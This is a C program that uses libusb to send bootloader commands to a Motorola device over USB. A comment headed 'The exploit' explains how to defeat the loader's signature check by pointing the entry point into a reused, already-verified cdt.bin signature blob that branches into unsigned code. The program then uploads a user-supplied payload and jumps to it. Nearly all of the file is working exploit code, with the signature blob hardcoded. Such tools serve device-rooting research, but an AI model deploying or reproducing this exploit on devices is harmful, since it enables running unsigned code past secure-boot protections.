#include <stdint.h>
#include <stdio.h>
#include "lusb0_usb.h"

#define MY_VID 0x22B8
#define MY_PID 0x4280
#define EP_IN 0x82
#define EP_OUT 0x01
#define BUF_SIZE 64

usb_dev_handle* open_dev(void)
{
    struct usb_bus* bus;
    struct usb_device* dev;

    for (bus = usb_get_busses(); bus; bus = bus->next)
    {
        for (dev = bus->devices; dev; dev = dev->next)
        {
            if (dev->descriptor.idVendor == MY_VID
                && dev->descriptor.idProduct == MY_PID)
            {
                return usb_open(dev);
            }
        }
    }
    return NULL;
}

uint64_t encodenum(uint32_t num)
{
    char ret[9];
    sprintf(ret, "%08x", num);
    return *(uint64_t *) ret;
}

void addr(usb_dev_handle* dev, uint32_t addr)
{
    char out[] = { 2, 'A', 'D', 'D', 'R', 0x1e, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3 };
    *(uint64_t*) &out[6] = encodenum(addr);
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void jump(usb_dev_handle* dev)
{
    char out[] = { 2, 'J', 'U', 'M', 'P', 0x1e, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3};
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void bin(usb_dev_handle* dev, void* buffer, uint16_t len)
{
    char out[] = { 2, 'B', 'I', 'N', 0x1e, 0, 0 };
    *(uint16_t*)&out[5] = _byteswap_ushort(len);

    char allout[0x3000];
    memcpy(allout, out, sizeof(out));
    memcpy(&allout[sizeof(out)], buffer, len);
    allout[sizeof(out) + len] = 0;
    allout[sizeof(out) + len + 1] = 3;

    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, allout, sizeof(out) + len + 2, 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void rqrc(usb_dev_handle* dev, uint32_t start, uint32_t end)
{
    char out[] = { 2, 'R', 'Q', 'R', 'C', 0x1e, 0, 0, 0, 0, 0, 0, 0, 0, ',',  0, 0, 0, 0, 0, 0, 0, 0, 3 };
    *(uint64_t*)&out[6] = encodenum(start);
    *(uint64_t*)&out[15] = encodenum(end);
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

uint8_t cdt_signature[] =
{
    0xB4, 0x01, 0x00, 0xCA, 0x02, 0x14, 0xDA, 0x95, 0x1B, 0x6D, 0xDC, 0x97, 0x07, 0xCE, 0x40, 0xEA,
    0x53, 0x0F, 0x90, 0x20, 0x91, 0xB5, 0x20, 0xDD, 0x2F, 0xF3, 0x00, 0x30, 0xFF, 0xFF, 0x00, 0x00,
    0x02, 0x4E, 0x29, 0x96, 0xC8, 0xE8, 0x57, 0x58, 0x1F, 0x75, 0x18, 0xBB, 0xB5, 0x76, 0xE1, 0x8A,
    0x17, 0x57, 0xC8, 0x78, 0xC3, 0x1D, 0x01, 0x02, 0x0C, 0x30, 0x00, 0x11, 0x01, 0x89, 0x07, 0x00,
    0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x02, 0x07, 0x6D, 0x23, 0xFF, 0xBC, 0xBE,
    0x5E, 0xC2, 0xC1, 0xE9, 0xCB, 0x5C, 0x8C, 0x4C, 0xC1, 0x49, 0xE3, 0xCE, 0x38, 0x88, 0x88, 0x67,
    0xF7, 0x37, 0xA8, 0x60, 0xBF, 0x43, 0xEC, 0xB6, 0x15, 0x7D, 0xAD, 0xB4, 0x93, 0x03, 0xCE, 0x78,
    0x3B, 0xA5, 0x4B, 0xFC, 0x30, 0xE8, 0xCF, 0x39, 0xB0, 0x5C, 0x9C, 0xAC, 0xA1, 0xD2, 0xCF, 0x59,
    0x77, 0x3B, 0xFF, 0xF8, 0x2C, 0x86, 0x5A, 0xE9, 0x48, 0x43, 0x86, 0x0E, 0x9E, 0xAC, 0xF9, 0x88,
    0x61, 0xB2, 0xB3, 0x14, 0x5F, 0xC2, 0x58, 0x28, 0x86, 0x44, 0xF6, 0x9A, 0xAD, 0xBE, 0xF1, 0x74,
    0xBD, 0xBA, 0xED, 0x1B, 0xE4, 0xBC, 0x19, 0xAF, 0xD9, 0x22, 0xA4, 0xE9, 0x84, 0x66, 0x39, 0x77,
    0xA3, 0x76, 0x81, 0x90, 0xFE, 0x52, 0xCC, 0x96, 0x77, 0xAC, 0xEE, 0xA6, 0x91, 0xB1, 0x5F, 0x1B,
    0x4F, 0xB2, 0x45, 0x80, 0xF1, 0x15, 0xB8, 0x6F, 0x52, 0x92, 0x01, 0x02, 0x01, 0x00, 0x04, 0x2E,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x48, 0x41, 0x42, 0x20, 0x43, 0x41, 0x20, 0x34, 0x37, 0x33, 0x4B, 0xB3,
    0x8B, 0xC1, 0x67, 0xEA, 0xD6, 0x41, 0x01, 0x00, 0x04, 0x39, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F,
    0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74,
    0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53,
    0x46, 0x20, 0x43, 0x41, 0x20, 0x34, 0x37, 0x33, 0x2D, 0x31, 0x3B, 0x20, 0x53, 0x4E, 0x3D, 0x34,
    0x34, 0x39, 0x36, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00, 0x80, 0xBB, 0xA5, 0x81, 0x22,
    0x50, 0x33, 0x87, 0x0C, 0xF6, 0x98, 0x95, 0x25, 0xF2, 0xF9, 0x15, 0x42, 0xD1, 0x55, 0x81, 0xE0,
    0x30, 0x29, 0xCE, 0xDA, 0xFC, 0x04, 0x97, 0xF4, 0x0A, 0x2B, 0x2D, 0x2E, 0xBC, 0x9C, 0xB4, 0x26,
    0xA2, 0x00, 0xDA, 0x9A, 0xE8, 0x9C, 0x32, 0x34, 0x0D, 0xCF, 0xB0, 0xE1, 0xAA, 0xA8, 0x6E, 0x41,
    0x36, 0x17, 0x11, 0x66, 0xBD, 0x71, 0xFE, 0xFD, 0x64, 0xFD, 0x44, 0x27, 0x4E, 0x8F, 0xA9, 0xBD,
    0xA6, 0x1E, 0x95, 0x58, 0xC5, 0x3C, 0x12, 0x35, 0x47, 0xE0, 0x5D, 0x06, 0x21, 0xC8, 0xC9, 0xF6,
    0x84, 0xB2, 0x03, 0x62, 0xF6, 0x25, 0xF6, 0x1C, 0x66, 0x4F, 0x48, 0xE1, 0x32, 0x90, 0xF4, 0x28,
    0x9B, 0x7C, 0xF7, 0x63, 0x8E, 0x1D, 0xDE, 0x8D, 0x1C, 0x0A, 0x1E, 0xE0, 0x1A, 0xAE, 0x2D, 0x22,
    0xCD, 0x84, 0x0E, 0x23, 0x7E, 0xB6, 0xDA, 0x83, 0x89, 0x03, 0x77, 0x3D, 0x00, 0x80, 0x31, 0x35,
    0x19, 0x89, 0xB2, 0xA9, 0x9F, 0xC6, 0xFB, 0x79, 0xC7, 0x7D, 0xA7, 0xCE, 0x25, 0x76, 0x9C, 0xD9,
    0x99, 0x77, 0x76, 0x3D, 0x89, 0x28, 0x71, 0xE6, 0xDA, 0xCC, 0x84, 0x35, 0xCC, 0xB6, 0xCF, 0xBE,
    0x54, 0x86, 0x1F, 0x9B, 0x76, 0x43, 0x3D, 0xEC, 0x9D, 0x63, 0xC0, 0xC9, 0xE1, 0x2C, 0xD4, 0xCF,
    0x46, 0x47, 0x28, 0xFB, 0xDA, 0xDB, 0x0C, 0x6C, 0x46, 0xCC, 0x08, 0x6F, 0xEA, 0x41, 0x96, 0x6A,
    0x38, 0x6D, 0xBD, 0x67, 0x58, 0x24, 0x17, 0xE5, 0xE1, 0xA7, 0x63, 0x7E, 0xDC, 0x8A, 0x85, 0x13,
    0xF8, 0x1F, 0x43, 0x3A, 0xC3, 0x59, 0x0B, 0x3A, 0x6F, 0x7E, 0x81, 0x41, 0x23, 0x21, 0xC4, 0x0E,
    0x62, 0x27, 0x50, 0xB4, 0xEA, 0xF6, 0xEF, 0x70, 0xB5, 0x03, 0xD1, 0x6D, 0x4D, 0xD7, 0x8A, 0x40,
    0x7B, 0x05, 0x09, 0x94, 0x35, 0x00, 0xC0, 0x5F, 0xB5, 0xAF, 0x5D, 0x4D, 0xB4, 0xC0, 0x01, 0x02,
    0x01, 0x00, 0x04, 0x30, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49,
    0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20,
    0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53, 0x46, 0x20, 0x43, 0x41, 0x20, 0x34,
    0x37, 0x33, 0x2D, 0x31, 0x4B, 0xB3, 0x8C, 0x73, 0x67, 0xEA, 0xD6, 0xF3, 0x01, 0x00, 0x04, 0x38,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x41, 0x50, 0x50, 0x20, 0x34, 0x37, 0x33, 0x2D, 0x31, 0x2D, 0x32, 0x3B,
    0x20, 0x53, 0x4E, 0x3D, 0x34, 0x34, 0x39, 0x38, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00,
    0x80, 0x9F, 0x29, 0x51, 0x44, 0x9E, 0x39, 0x88, 0xE3, 0xD4, 0xB3, 0x57, 0x95, 0x22, 0x9F, 0x19,
    0x94, 0x14, 0x94, 0x2D, 0xCE, 0x30, 0xB5, 0x57, 0x24, 0xC5, 0x59, 0x0F, 0xF5, 0x4A, 0xF9, 0x5D,
    0x78, 0xD4, 0x95, 0x0F, 0xAA, 0x94, 0xFA, 0xE3, 0x9D, 0x82, 0xEA, 0x61, 0x28, 0xFF, 0x38, 0x7F,
    0x85, 0x86, 0x9C, 0x14, 0x70, 0x36, 0x11, 0x91, 0x44, 0xD7, 0xCC, 0xD0, 0xE0, 0x00, 0xFA, 0x2B,
    0xE6, 0x79, 0x63, 0xB9, 0xA7, 0xE7, 0xB5, 0x95, 0x3B, 0x86, 0x89, 0xD6, 0xE3, 0x80, 0xE6, 0xF5,
    0x2F, 0x0C, 0x12, 0x22, 0x63, 0x3E, 0x4A, 0xF4, 0x07, 0xCC, 0x53, 0xF4, 0xF7, 0x12, 0x40, 0xAA,
    0x39, 0xFE, 0x20, 0x8D, 0xCA, 0xF0, 0x52, 0x5D, 0x77, 0x85, 0x82, 0x35, 0x4B, 0x5D, 0x9D, 0x2D,
    0x87, 0x24, 0x15, 0xD0, 0xCC, 0xFE, 0x66, 0xA8, 0x13, 0xFD, 0xE0, 0xC7, 0x13, 0x75, 0x24, 0x4E,
    0x43, 0x00, 0x80, 0x46, 0x8C, 0xBA, 0x26, 0x19, 0x32, 0x88, 0x53, 0xB6, 0x49, 0x18, 0x98, 0xE5,
    0xAF, 0x90, 0x1E, 0xFD, 0xF0, 0x46, 0xB5, 0x1C, 0x7F, 0x43, 0xCC, 0x97, 0xAB, 0x47, 0x16, 0x70,
    0x4A, 0xD5, 0x34, 0x5A, 0xCA, 0xAE, 0x7C, 0x14, 0x25, 0xAB, 0x3D, 0x7A, 0x0E, 0xF1, 0x6F, 0x15,
    0x83, 0x0B, 0xB2, 0x9B, 0x45, 0x15, 0xB8, 0x47, 0x87, 0xBC, 0x03, 0x83, 0x3B, 0x59, 0x0F, 0x09,
    0xD1, 0xCA, 0x72, 0xB0, 0xD6, 0xC0, 0x6E, 0x28, 0x7D, 0x86, 0x68, 0xCC, 0x29, 0x70, 0x77, 0xE5,
    0x72, 0x72, 0x74, 0xAD, 0x6C, 0xA1, 0xC4, 0x07, 0x9D, 0xCA, 0x9F, 0x5D, 0x8A, 0x64, 0x0F, 0x2D,
    0xA7, 0xD7, 0x8F, 0x20, 0xFE, 0x00, 0x06, 0xAE, 0x6D, 0x50, 0xC4, 0x86, 0x87, 0x30, 0x4A, 0xD8,
    0x96, 0x70, 0x32, 0x85, 0xC3, 0x2C, 0x22, 0x4E, 0x3D, 0x8B, 0x24, 0x01, 0x98, 0x90, 0x18, 0x20,
    0xE5, 0xE8, 0x8C, 0x22, 0x19, 0x2E, 0x8B, 0x50, 0x69, 0x6C, 0xC8, 0x0C, 0x9A, 0x03, 0x72, 0x19,
    0x9F, 0xBA, 0x90, 0x78, 0x2C, 0x04, 0xA0, 0x93, 0x1A, 0x90, 0xE5, 0x44, 0xEE, 0xEE, 0x2B, 0xE6,
    0x3E, 0x18, 0x95, 0x06, 0x33, 0xED, 0x67, 0xA1, 0x17, 0x20, 0x3D, 0x6E, 0xAB, 0x6D, 0xAE, 0x09,
    0x67, 0x2A, 0xE6, 0x4C, 0xA4, 0x57, 0x6C, 0x92, 0xEA, 0x4D, 0xE2, 0x0B, 0x2E, 0x5A, 0xBC, 0x34,
    0x46, 0xC3, 0x30, 0x1E, 0x5F, 0x95, 0x6B, 0xB6, 0xBC, 0x39, 0x9B, 0x91, 0x29, 0xB2, 0x1A, 0xDF,
    0x19, 0x36, 0x1E, 0x8C, 0x7B, 0xE1, 0x9A, 0xF9, 0x41, 0x4E, 0x4F, 0x2B, 0xA7, 0x25, 0xCE, 0x49,
    0xCB, 0x06, 0xFB, 0x3C, 0xEB, 0x8D, 0x93, 0xAE, 0xFC, 0x0B, 0x46, 0x9E, 0xE2, 0x8C, 0xD8, 0x4D,
    0x45, 0x4B, 0xBB, 0x93, 0x2E, 0x70, 0xBA, 0xF3, 0x16, 0x1D, 0x1F, 0xFB, 0x89, 0x32, 0xD0, 0x73,
    0x35, 0x9E, 0xAB
};

void rqinfo(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'I', 'N', 'F', 'O', 0x1e, 0, 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void rqsw(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'S', 'W', 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void rquid(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'U', 'I', 'D', 0x1e, '0', 0, '0', 0, 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

#pragma pack(push, 1)
struct ramldr
{
    uint32_t entrypoint;
    uint32_t magic;
    uint32_t field_8;
    uint32_t field_C;
    uint32_t public_key;
    uint32_t field_14;
    uint32_t field_18;
    uint32_t field_1C;
    uint32_t field_20;
    uint32_t field_24;
    uint32_t field_28;
    uint32_t signature;
};
#pragma pack(pop)

int main(int argc, char ** argv)
{
    if (argc != 2)
    {
        printf("usage: %s <payload>\n", argv[0]);
        return 0;
    }

	usb_init();
	usb_find_busses();
	usb_find_devices();

    usb_dev_handle* dev = open_dev();
    if (!dev)
    {
        printf("error opening device: \n%s\n", usb_strerror());
        return 0;
    }

    if (usb_claim_interface(dev, 0) < 0)
    {
        printf("error claiming interface %s\n", usb_strerror());
        usb_close(dev);
        return 0;
    }
    else
    {
        printf("success: claim_interface\n");
    }

    /*
        The exploit:
         - Nothing checks if the entrypoint is signed or not.
         - There are two checks on it:
            - it has to point inside the ramldr buffer 0x82000000 - 0x8204CFFF
            - that it has to point to an address that is signature checked
         - The signatures adds themself to checked list (Why ?)
         - The cdt.bin is loaded to the memory and untuched
         - If we use the already loaded cdt.bin's signature it will pass the signature check
         - If we point the entrypoint inside the signature it will pass the range check
         - On 0x820001AB we have a 'B 0x8200050E', we call that and run our unsigned code
    */

    uint8_t buff[0x510];
    memset(buff, 0, sizeof(buff));

    ramldr *hdr = (ramldr *) buff;

    hdr->entrypoint = 0x820001AB; // entry point, range chacked
    hdr->magic = 0xB17219E9; // hardcoded magic
    hdr->public_key = 0x89311290; // Let's use the public key inside the mbm
    hdr->signature = 0x82000030; // signature, range chacked

    memcpy(&buff[0x30], cdt_signature, sizeof(cdt_signature));

    uint8_t nop[2] = { 0x00, 0xBF };
    memcpy(&buff[0x50E], nop, sizeof(nop));
    
    addr(dev, 0x82000000);
    bin(dev, buff, sizeof(buff));

    FILE *f = fopen(argv[1], "rb");
    int len;
    uint8_t payload[0x2000];
    uint32_t ptr = 0x82000510;
    while (len = fread(payload, 1, sizeof(payload), f))
    {
        addr(dev, ptr);
        bin(dev, payload, len);
        ptr += len;
    }
    fclose(f);

    rqrc(dev, 0x82000000, 0x8204CFFF);

    jump(dev);
    
    usb_release_interface(dev, 0);

    if (dev)
    {
        usb_close(dev);
    }
    printf("Done.\n");

    return 0;
}
